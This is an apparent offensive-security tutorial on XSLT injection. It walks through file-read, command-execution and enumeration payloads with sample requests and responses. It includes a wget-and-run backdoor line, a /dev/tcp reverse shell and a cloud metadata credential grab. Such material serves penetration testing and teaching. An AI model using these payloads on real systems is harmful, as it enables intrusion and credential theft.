# 👀 XSLT

#### **Understanding the Vulnerabilities**

XSLT (eXtensible Stylesheet Language Transformations) is a powerful language used to transform XML documents into various formats like HTML, plain text, or other XML structures. However, its powerful functionality can become a double-edged sword when mishandled, especially in server-side processing.

When a server processes XSLT inputs from untrusted sources, it becomes vulnerable to injection attacks. Malicious actors can leverage XSLT to achieve Local File Inclusion (LFI), Remote Code Execution (RCE), or even data exfiltration. Let’s dive into the complexities, provide real-world examples, and explore the possibilities attackers can exploit.

#### **Step 1: Identifying Potential XSLT Usage**

**Scenario: Analyzing Server Responses**

Imagine you’re testing a web application that accepts XML-based input. You upload an XML document, and the response contains some suspicious output. For instance, let’s say the server echoes transformed data like this:

```markup
<transformation>
    <result>This is transformed content</result>
</transformation>
```

**Signs of XSLT Usage**

1. **Endpoints Accepting XML Payloads**:\
   Endpoints like `/process-xml` or `/transform` may suggest XML processing.
2. **Headers in HTTP Responses**:\
   Look for headers such as `Content-Type: application/xml` or `X-Processed-By: XSLTProcessor`.
3. **Error Messages**:\
   If your payload triggers an error, detailed stack traces may reveal underlying XSLT functionality, such as:

```markup
XSLTProcessor::transformToDoc() failed: unexpected tag in expression.
```

#### **Local File Inclusion (LFI) via XSLT**

**Understanding the Risk**

With XSLT 2.0, the `unparsed-text()` function can be used to read local files on the server. If the XSLT processor is improperly configured or doesn’t validate input, attackers can use this to read sensitive files, such as `/etc/passwd` or application configuration files.

**Example Payload: Reading `/etc/passwd`**

Once you’ve confirmed that XSLT injection is possible, test for LFI by attempting to read sensitive files:

**Malicious Payload**:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="unparsed-text('/etc/passwd')" />
    </xsl:template>
</xsl:stylesheet>
```

***

**Request and Response in Burp Suite**

**Request**:

```http
POST /process-xml HTTP/1.1
Host: example.com
Content-Type: application/xml
Content-Length: 456

<?xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="unparsed-text('/etc/passwd')" />
    </xsl:template>
</xsl:stylesheet>
```

**Response**:

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

This confirms that the application allows reading local files using XSLT 2.0’s `unparsed-text()` function.

***

**LFI with PHP-Integrated XSLT Libraries**

If the XSLT processor integrates with PHP and is configured to allow PHP function calls, an attacker can escalate the attack using the `file_get_contents()` function. This provides broader compatibility and flexibility for reading files.

**Example Payload: Using `file_get_contents()`**

```xml
<xsl:value-of select="php:function('file_get_contents', '/etc/passwd')" />
```

This variant relies on the PHP integration and demonstrates how misconfiguration can expand an attack’s reach. The same logic can be applied to access sensitive application data:

```xml
<xsl:value-of select="php:function('file_get_contents', '/var/www/html/config.php')" />
```

**Complex Example: Targeting API Keys**

Suppose the application stores API keys in a file:

```xml
<xsl:value-of select="php:function('file_get_contents', '/var/www/secrets/api_key.txt')" />
```

The attacker gains direct access to the key, potentially allowing further API misuse or data exfiltration.

***

#### **Remote Code Execution (RCE) via XSLT**

**Why RCE is Possible**

When XSLT processors support PHP functions or custom extensions, attackers can execute arbitrary commands by leveraging PHP functions like `system()`, `exec()`, or `shell_exec()`.

**Basic RCE Payload**

If PHP functions are enabled in the XSLT processor, test for RCE by invoking system commands:

**Malicious Payload**:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="php:function('system', 'id')" />
    </xsl:template>
</xsl:stylesheet>
```

***

**Response in Burp Suite**

**Request**:

```http
POST /process-xml HTTP/1.1
Host: example.com
Content-Type: application/xml
Content-Length: 456

<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:value-of select="php:function('system', 'id')" />
    </xsl:template>
</xsl:stylesheet>
```

**Response**:

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The output confirms RCE, as the `id` command reveals the server’s user context.

**Escalating to Sensitive File Access**

Another common payload targets specific files, such as a flag in Capture The Flag (CTF) scenarios or proprietary application files:

```xml
<xsl:value-of select="php:function('system', 'cat /flag.txt')" />
```

**Real-World RCE: Command Chaining**

In a real-world attack, an attacker could chain commands to create backdoors or exfiltrate data. For example:

```xml
<xsl:value-of select="php:function('system', 'wget http://malicious-site.com/backdoor.sh -O /tmp/backdoor.sh && bash /tmp/backdoor.sh')" />
```

This payload downloads a backdoor script and executes it, giving the attacker remote access to the system.

***

#### **Complex Payload Scenarios**

**Scenario 1: File Enumeration**

Attackers can enumerate files to locate sensitive information:

```xml
<xsl:for-each select="php:function('scandir', '/var/www/')">
    <xsl:value-of select="."/><xsl:text>&#10;</xsl:text>
</xsl:for-each>
```

This iterates through files in a directory and lists their names, helping attackers understand the system structure.

```markup
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:for-each select="php:function('scandir', '/var/www/')">
            <xsl:value-of select="."/><xsl:text>&#10;</xsl:text>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet>
```

#### **Response**:

```markup
index.php
config.php
.htaccess
uploads
logs
backup.sql
```

**Scenario 2: Remote Shell Access**

Attackers can create a reverse shell to maintain persistent access:

```xml
<xsl:value-of select="php:function('system', 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1')" />
```

This payload establishes a connection to the attacker’s machine, giving them a remote shell.

***

**Scenario 3: Targeting Cloud Metadata Services**

In cloud environments, attackers often target metadata services to extract sensitive details:

```xml
<xsl:value-of select="unparsed-text('http://169.254.169.254/latest/meta-data/iam/security-credentials/')" />
```

This payload retrieves cloud credentials, which could lead to full account compromise.
